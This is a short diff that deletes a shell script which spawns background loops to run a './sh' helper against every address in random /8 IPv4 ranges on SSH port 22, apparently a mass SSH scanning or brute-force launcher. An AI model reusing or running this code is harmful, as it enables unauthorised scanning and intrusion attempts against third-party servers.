@@ -1,3 +1,0 @@
-end=5
-for i in $(seq 1 $end); do awk -v a=$(($RANDOM % 128)) 'BEGIN{for(b=0;256>b;b++) for(c=0;256>c;c++) for(d=0;256>d;d++) system("./sh "a"."d"."c"."b" 22 > /dev/null")}'& done
-
